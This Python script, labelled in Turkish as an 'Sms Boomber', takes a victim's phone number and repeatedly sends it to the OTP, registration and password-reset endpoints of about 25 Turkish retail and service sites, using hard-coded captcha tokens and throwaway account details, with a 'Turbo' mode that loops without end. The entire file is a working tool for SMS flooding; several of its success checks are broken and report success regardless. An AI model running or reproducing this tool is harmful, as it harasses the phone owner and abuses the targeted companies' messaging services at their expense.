import json
import os
import sys
import requests
import time
import uuid
from colorama import init, Fore
from urllib3.util import url

init(autoreset=True)

sms = ["████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ████████████             ████████████  ████████████████████████████",
       "████████████████████████████  █████████████           █████████████  ████████████████████████████",
       "████████████████████████████  ███████████████       ███████████████  ████████████████████████████",
       "██████████                    ████████████████     ████████████████  ██████████",
       "██████████                    ███████   ███████   ███████   ███████  ██████████",
       "██████████                    ███████    ███████ ███████    ███████  ██████████",
       "██████████                    ███████      ███████████      ███████  ██████████",
       "████████████████████████████  ███████        ███████        ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "                  ██████████  ███████                       ███████                    ██████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       "████████████████████████████  ███████                       ███████  ████████████████████████████",
       ]

flx = [
    "███████████████████████████████      ███████████                        ███████████        ███████████",
    "██████████████████████████████       ███████████                        ███████████        ███████████",
    "█████████████████████████████        ███████████                         ███████████      ███████████",
    "████████████████████████████         ███████████                          ███████████    ███████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ███████████                             █████████████████████",
    "███████████                          ███████████                              ███████████████████",
    "███████████                          ███████████                               █████████████████",
    "███████████                          ███████████                                 █████████████",
    "█████████████████████                ███████████                                   █████████",
    "████████████████████                 ███████████                                 ████████████",
    "███████████████████                  ███████████                               ████████████████",
    "██████████████████                   ███████████                              ██████████████████",
    "███████████                          ███████████                             ████████████████████",
    "███████████                          ███████████                            ██████████████████████",
    "███████████                          ███████████                           ███████████  ███████████",
    "███████████                          ████████████████████████████         ███████████    ███████████",
    "███████████                          ████████████████████████████        ███████████      ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
    "███████████                          ████████████████████████████       ███████████        ███████████",
]


def sok(numara):
    url = "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate"
    payload = {
        "captchaAction": "generate_register_otp",
        "captchaToken": "",
        "clientId": "buyer-web",
        "phoneNumber": numara,
        "reCaptchaV2": False
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Şok Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Şok Başarısız!")


def kahvedunyasi(numara):
    url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
    paykoad = {
        "countryCode": "90",
        "phoneNumber": numara,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=paykoad, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" KahveDünyası Başarılı!")
    else:
        print(Fore.RED + "[+] " + numara + " ------>"" KahveDünyası Başarısız!")


def dominosgiris(numara):
    url = "https://frontend.dominos.com.tr/api/authentication/sendLoginOtpCode"
    payload = {
        "captchaToken": "03AFcWeA4uOFC5Bvy2gGdsKR-iADZjBWZ7ac4o31US1ZEa2BHFt0FEvEPV0hhNwGjG98uheeORhHISBHX4lnHG04iigH_X7hoPbdMnCAmp2BE4GXzKGZH28x3a75JlFhcK_QfXGistOKYIZkvirTtQDn8C2Jjp00nOLm-uOgZepYU0_gHcUQcQAseGuaJwqDCffT4hAIu2Qz6yTmp9HcqI6DV76yZdqAjL9qJS_Pj54aNCBzvNxPNu7oITVusj4FlIZzn3-5F1bBrXn6d1IAO8k0OHUiIic28oFtupijEGa0WagcppHmx7NiUXPIWv_nnIYII5aFB9_sgWA_UZkdN4W_OfDcq2aM4UPanCe5KIlcz6PpKDFWjquacoEu8XFA--4WYiQVELdQYYjU13MD59bSx4MQI5gn-P2mkAF_t8nvNraLWKv9CriJY9nDdDmzhGO3u_7Tprce934lDWCEItyX7h4yInKOrfWMRzC1QqLO5NuSXAQcCeWMfPUn2CHOIDhow_KgsQjHvqWzTMMT00A70m4IQ1v9_SZtguiHFbbE097umfJQN5ZskRNKr9zWrCcCdwDQMZqI-jzJ95xRuzcZoPm47z8hzn_rrAfTLvt2pzdRgE4Z3z1LMkeaD9Vr000uU9wRVEumeDzrLuAzo-2sOHwF5GCQPdPzYGI070DtL2da92esomlxG1u66gIDDbTg4mypWvBhTQVglNl0IapgXg1SQa8bx3fPwLlgL9xk051uvFxjREdI2usnS95vWhVlprb4b1orgnfvfV18Ticsbv4eV8L2PM9Q4q6oy_vVBS4XNNroYpwM9gqIn6zuTm_q1UZLYCMiWaTt17o80Y2kCqtg2nBNS7DwJB5XVqxp_qHcdeciM9EFawZP698J1KvcYzLt7wRvUK_JD3AWsQiYR9K0L0QtWNhwSE0hHjQmzT_QQ3y4uZkXQ",
        "channelCode": "WEB",
        "email": "",
        "isRegisterV2": False,
        "isSure": False,
        "mobilePhone": numara
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Dominos Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Dominos Başarısız!")


def kimgbister(numara):
    url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/pin/send-otp"
    payload = {
        "msisdn": numara,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.koton.com/users/register/",
        "Referer": "https://www.koton.com/users/register/",
    }
    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200:
        try:
            data = response.json()
            if data.get("code") == "login_otp_locked":
                print(Fore.RED + "[-] " + numara + " ------>"" kimgbister OTP kilitli, gönderim engellendi!")
            else:
                print(Fore.GREEN + "[+] " + numara + " ------>"" kimgbister Başarılı!")
        except json.JSONDecodeError:
            print(Fore.YELLOW + "[!] " + numara + " ------>"" kimgbister: JSON çözümlenemedi ama status 200")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" kimgbister Başarısız!")


def bitlo(numara):
    url = "https://api.bitlo.com/auth/forgot-password"
    payload = {
        "identifier": "+90" + numara,
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 1015]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Bitlo Başarılı")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Bitlo Başarısız!")


def koton(numara):
    url = "https://www.koton.com/users/register/"  # Buraya doğru endpoint gelecek

    payload = {
        "call_allowed": False,
        "confirm": True,
        "date_of_birth": "2001-01-01",
        "email": "sms@yopmail.com",
        "email_allowed": False,
        "first_name": "fawewaeq",
        "gender": "male",
        "kvkk_confirm": True,
        "last_name": "syopmailcom",
        "password": "aELZrsELfXGyuC9",
        "phone": numara,
        "sms_allowed": True
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.koton.com/users/register/",
        "Referer": "https://www.koton.com/users/register/"
    }

    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200 or 202:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Koton Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Koton Başarısız!")


def tıklagelsin(numara):
    url = "https://www.tiklagelsin.com/user/graphql"

    query = """
    mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
      generateOtp(
        phone: $phone
        challenge: $challenge
        deviceUniqueId: $deviceUniqueId
      )
    }
    """

    variables = {
        "phone": "+90" + numara,
        "challenge": "cf33df06-9935-48f3-9267-6282dc0a9bec",
        "deviceUniqueId": "web_55ab0574-9d20-4bba-9da0-9c445a34c2d2"
    }

    payload = {
        "operationName": "GENERATE_OTP",
        "query": query,
        "variables": variables
    }

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        result = response.json()
        if result.get("data", {}).get("generateOtp") is not None:
            print(Fore.GREEN + "[+] " + numara + " ------>"" TiklaGelsin Başarılı!")
        else:
            print(Fore.RED + "[-] " + numara + " ------>"" TıklaGelsin Başarısız!")


def englishhome(numara):
    url = "https://www.englishhome.com:443/api/member/sendOtp"
    payload = {
        "Phone": numara,
        "XID": ""
    }
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*",
               "Referer": "https://www.englishhome.com/", "Content-Type": "application/json",
               "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty",
               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"
               }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Naos Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Naos Başarısız!")


def naos(numara):
    url = "https://naosstars.com/api/smsSend/0f6a94f0-31ac-4e49-9755-eac060de07be"
    payload = {
        "email": "sms@yopmail.com",
        "first_name": "fawewdwaaeq",
        "invitation_code": "",
        "kvkk": "1",
        "last_name": "dwafawfwa",
        "new_password": "6hspHE5jLhZwaZN",
        "telephone": "(+90)" + numara,
        "type": "register",
        "user_check": "1",
    }
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Englishhome Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Englishhome Başarısız!")


def evidia(numara):
    url = "https://www.evidea.com/users/register/"
    payload = {
        "confirm": True,
        "email": "sms@yopmail.com",
        "first_name": "Fawewdwaaeq",
        "g-recaptcha-response": "03AFcWeA73_E4Zb1tr_VrZTZ5dV0d44L3xucAu47xcaCApclsUwKzzvWmCrcLiYoutmhOOMqq915bnEQCPVAqEBN5vGfuucToZWNZBKTueVY6svQXpHolA8lzp0wrwKD7a9GOOlO4sFdhHmuo8Kg6SMzLYTPzFlh5c9JJeOP-WF5-K5n-BIbHcgcpbsj9jNpnud-x-idgfdlOFQUK3Bq2oQy_aEW3HwvSnobIcAW1mD82FhgMBzJPBeVCMeEnqubrRIJ18Zd5IjXea_tUAEN4JulJf6xU7r6YUJegba9j3izASoHxYFnrZFWIooYlU9sinRaFCH17EBOLQYeCvZjfMzGO22rnUZUmQG6g4QrnAzrEkOwu9s3qhY3gu95irqwA2RQ92Qvokw0j3w1P9bCg0Kllo1Y3HYVXk5EtNKMQC4rMX3ku3dyXtlwJ21a6xLaKINL_MlAA9v25-dxr4ZD3ZxFRz0AB_-jtTFXhdmf5BRmPszThm17S88Wy73G2gnwpKoqP3_f-I5G6CKFNbnpkq7nSjfhFu7Tdaen9wfPWw92NwvTHgmepCUXMc1wxQ9ar8aMphe5AV7uuMJs82RAe51PK8R-OfZ-EB3Q4RDdebCgiVVpG80T8eo5X7sSyYLbs-54UZYzqU0QCfDitoGVvpTGhz_CpZjHxSJlPk-P917lwixqtA5FbOs6FPzdqc3ZU7QeiOG5KVNf8PVFECXMtIgNAW69Dg6R3lhEB4JH2BGxjZB-iBwubwuJlgagqRL_GQL64Yp7n4u4HGaRWEVp1t6qzUmAKERWVVM6MGCZHRAmXl-27MKCQ7tZ0ZGYY0YZepCVj-DnTedZ417uDwdNeUwhR6gcr_WiHY0zuVolgMoHfB8AVzIZV2E6h9Zfzc6QbfdUM0Bm6ht9x6TOjXvbNR02oX56KW5XXW3_0JBco8CVMg2u1HoxCpi4c",
        "last_name": "Aoıwaeju",
        "password": "L3Pr66pinxzaH9L",
        "password-repeat": "L3Pr66pinxzaH9L",
        "phone": "0" + numara,
        "phone-two": "0" + numara,
        "sms_allowed": True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Evidia Başarılı!")
    else:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Evidia Başarılı!")


def occasion(numara):
    url = "https://www.occasion.com.tr/users/registration/"
    payload = {
        "next": "/account/profile/",
        "date_of_birth": "01-01-2001",
        "first_name": "Ssawdwad",
        "last_name": "Adwafad",
        "email": "sms@yopmail.com",
        "phone": "0" + numara,
        "password": "Awaeyaw78eawue231!",
        "is_allowed": True,
        "confirm": True,
        "sms_allowed": True,
        "email_allowed": True,
        "call_allowed": True,
        "permissions": True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Occasion Başarılı!")
    else:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Occasion Başarılı!")


def damattween(numara):
    url = "https://www.damattween.com/users/register/"
    payload = {
        "email": "sms@hopmail.com",
        "first_name": "sawdwafdwa",
        "last_name": "awdwdsawf",
        "password": "Asawegawyue1273!",
        "phone": "0" + numara,
        "confirm": True,
        "email_allowed": True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Damattween Başarılı!")
    else:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Damattween Başarılı!")


def sportive(numara):
    url = "https://www.sportive.com.tr/api/client/users/check?options=%7B%22contentType%22%3A%22application%2Fjson%22%2C%22responseType%22%3A%22json%22%7D"
    payload = {
        "otp_send": True,
        "phone": "0" + numara,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Sportive Başarılı!")
    else:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Sportive Başarılı!")


def mudo(numara):
    url = "https://www.mudo.com.tr/users/register/"
    payload = {
        "add_loyalty": True,
        "confirm": True,
        "date_of_birth": "2001-01-01",
        "email": "sms@yopmail.com",
        "email_allowed": True,
        "first_name": "Ssawdwad",
        "gender": "null",
        "last_name": "Adwafad",
        "password": "gZUB7zxy9YJLQTR!",
        "phone": numara,
        "sms_allowed": True,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Mudo Başarılı!")
    else:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Mudo Başarılı!")


def houseofsuperstep(numara):
    url = "https://www.houseofsuperstep.com/users/register/"
    payload = {
        "call_allowed": True,
        "confirm": True,
        "date_of_birth": "2001-01-01",
        "email": "sms@yopmail.com",
        "email_allowed": True,
        "first_name": "fawewaeq",
        "gender": "male",
        "kvkk_confirm": True,
        "last_name": "SwaewadS",
        "password": "Aawjeuwaıheuıwa!324",
        "phone": "0" + numara,
        "sms_allowed": True
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Houseofss Başarılı!")
    else:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Houseofss Başarılı!")


def Bim(numara):
    url = "https://bim.veesk.net:443/service/v1.0/account/login"
    payload = {
        "phone": numara,
    }
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Bim Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Bim Başarısız!")


def komagene(numara, token=None):
    url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
    payload = {
        "FirmaId": 32,
        "Telefon": numara
    }
    headers = {
        "Content-Type": "application/json",
        "firmaid": "32",
        "origin": "https://www.komagene.com.tr",
        "referer": "https://www.komagene.com.tr/",
        "anonymousclientid": str(uuid.uuid4()),  # Rastgele UUID
        "x-guatamala-kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Komagene Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Komagene Başarısız!")


def ozdilekteyim(numara):
    base_url = "https://api.ozdilekteyim.com/rest/v2/magaza-magaza-store/sms/anonymous/sendotp"
    params = {
        "phoneNumber": numara,
        "eventType": "register",
        "emailAddress": "sms@yopmail.com",
        "lang": "tr",
        "curr": "TRY"
    }
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(base_url, params=params, headers=headers)
    if response.status_code == [200, 201]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Özdilekteyim Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Özdilekteyim Başarısız!")


def ikinciyeni(numara):
    url = "https://apigw.ikinciyeni.com/RegisterRequest"
    payload = {
        "accountType": "1",
        "email": "sms@yopmail.com",
        "isAddPermission": True,
        "lastName": "sawdawd",
        "name": "edaweawe",
        "phone": numara,
    }
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" İkinciyeni Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" İkinciyeni Başarısız!")


def totalenergies(numara):
    url = "https://apimobile.guzelenerji.com.tr/exapi/profile"
    payload = {
        "first_name": "Awddaw",
        "last_name": "Dwaddwa",
        "date_of_birth": "1977-07-08T00:00:00-03:00",
        "gender": "not_specify",
        "email": "sms@yopmail.com",
        "phone": "0" + numara,
        "city": "ADANA",
        "county": "ALADAĞ",
        "plate_number": "16ESA32",
        "member_type": 2,
        "member_type_name": "Standart",
        "reference_type": 6,
        "reference_type_name": "Web",
        "call_allowed": True,
        "sms_allowed": True,
        "email_allowed": True,
        "push_allowed": True,
        "cookie_allowed": True,
        "explicit_consent_permission": True,
        "membership_agreement": True,
        "kvkk": True,
        "created_at": "2025-07-08T22:20:11-03:00",
        "updated_at": "2025-07-08T22:20:11-03:00",
        "last_online_time": "2025-07-08T22:20:11-03:00"
    }
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Totalenergies Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Totalenergies Başarısız!")


def pinarsu(numara):
    url = "https://yasampinarim.com.tr/Authentication/SendSms"
    payload = {
        "phone": numara,
    }
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Pinarsu Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Pinarsu Başarısız!")


def filemarket(numara):
    url = "https://api.filemarket.com.tr:443/v1/otp/send"
    payload = {
        "mobilePhoneNumber": f"90{numara}"
    }
    headers = {"Accept": "*/*", "Content-Type": "application/json",
               "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS",
               "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"
               }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 202:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Filemarket Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Filemarket Başarısız! ")


def digital(numara):
    url = "https://api.345dijital.com:443/api/users/register"
    payload = {
        "email": "",
        "name": "Memati",
        "phoneNumber": f"+90{numara}",
        "surname": "Bas"
    }

    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
               "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
               "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"
               }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == [200, 202]:
        print(Fore.GREEN + "[+] " + numara + " ------>"" 345Digital Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" 345Digital Başarısız!")


def money(numara):
    url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
    payload = {
        "phone": f"{numara[:3]} {numara[3:10]}",
        "GRecaptchaResponse": ''
    }
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*",
               "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest",
               "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty",
               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers",
               "Connection": "keep-alive"
               }
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print(Fore.GREEN + "[+] " + numara + " ------>"" Money Başarılı!")
    else:
        print(Fore.RED + "[-] " + numara + " ------>"" Money Başarısız!")


main = [money,
        digital,
        filemarket,
        pinarsu,
        totalenergies,
        ikinciyeni,
        ozdilekteyim,
        komagene,
        totalenergies,
        Bim,
        houseofsuperstep,
        mudo,
        sportive,
        damattween,
        occasion,
        evidia,
        kahvedunyasi,
        dominosgiris,
        kimgbister,
        bitlo,
        koton,
        tıklagelsin,
        englishhome,
        naos,
        sok]

os.system("cls" if os.name == "nt" else "clear")
for line in flx:
    print(Fore.RED + line)

print("Developer By : FLX                   İG : @x__flx__                     Sms Boomber\n")
print(Fore.MAGENTA + "25 SMS SERVİSİ\n")

print(Fore.YELLOW + "1 - Normal Sms")
print(Fore.YELLOW + "2 - Turbo Sms")
print(Fore.YELLOW + "3 - Çıkış")
seçim = input(Fore.BLUE + "\nSeçim: ").strip()

# Geçersiz seçim
if seçim not in ["1", "2", "3"]:
    sys.exit()

# Çıkış
if seçim == "3":
    sys.exit()

# Numara al
os.system("cls" if os.name == "nt" else "clear")
numara = input(Fore.RED + "Numara: ").strip()

# Normal SMS
if seçim == "1":
    os.system("cls" if os.name == "nt" else "clear")
    aralık = input(Fore.YELLOW + "Kaç saniye arayla göndermek istersin? (Varsayılan = 1): ").strip()
    if aralık == "":
        aralık = 1
    else:
        try:
            aralık = int(aralık)
        except ValueError:
            aralık = 1

    os.system("cls" if os.name == "nt" else "clear")
    adet_input = input(Fore.YELLOW + "Kaç adet sms gönderilsin? (Enter = sonsuz): ").strip()
    print("\n" * 500)
    for line in sms:
        print(Fore.RED + line)
    if adet_input == "":
        i = 0
        try:
            while True:
                func = main[i % len(main)]
                func(numara)
                i += 1
        except KeyboardInterrupt:
            print(Fore.RED + "\nProgram sonlandırıldı.")
            sys.exit()
    else:
        try:
            adet = int(adet_input)
        except ValueError:
            adet = len(main)

        for i in range(adet):
            func = main[i % len(main)]
            func(numara)
            time.sleep(aralık)


# Turbo SMS
elif seçim == "2":
    os.system("cls" if os.name == "nt" else "clear")
    i = 0
    print("\n" * 500)
    for line in sms:
        print(Fore.RED + line)

    i = 0
    try:
        while True:
            func = main[i % len(main)]
            func(numara)
            i += 1
    except KeyboardInterrupt:
        print(Fore.RED + "\nProgram sonlandırıldı.")
        sys.exit()
